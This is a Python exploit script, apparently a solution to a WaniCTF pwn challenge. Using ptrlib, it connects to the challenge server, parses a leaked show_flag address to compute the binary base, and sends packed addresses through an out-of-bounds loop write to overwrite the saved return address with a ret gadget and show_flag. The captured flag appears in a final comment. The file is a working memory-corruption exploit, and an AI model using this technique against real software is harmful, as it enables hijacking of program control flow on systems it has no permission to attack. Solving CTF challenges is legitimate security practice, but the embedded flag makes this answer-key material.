"""
Overwrite RIP due to for loop OOB 
"""

from ptrlib import *

file = "./chall"
e = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sock = Socket("nc chal-ywu5dn.wanictf.org 9004")
#sock = Process(file)
sock.debug = True

rop_ret = 0x00101a

sock.recvuntil("show_flag = ")
addr_flag = int(sock.recvline(), 16)
base = addr_flag - e.symbol("show_flag")

print(f"{addr_flag:x}")

calory = "1"
amount = "0"
for i in range(3):
    sock.sendlineafter(":", p64(addr_flag))
    sock.sendlineafter(":", calory)
    sock.sendlineafter(":", amount)

sock.sendlineafter(":", p64(base + rop_ret) + p64(addr_flag))
sock.sendlineafter(":", b"A")
sock.sendlineafter(":", b"A")

sock.sh()
# FLAG{B3_c4r3fu1_wh3n_using_th3_f0rm4t_sp3cifi3r_1f_in_sc4nf}
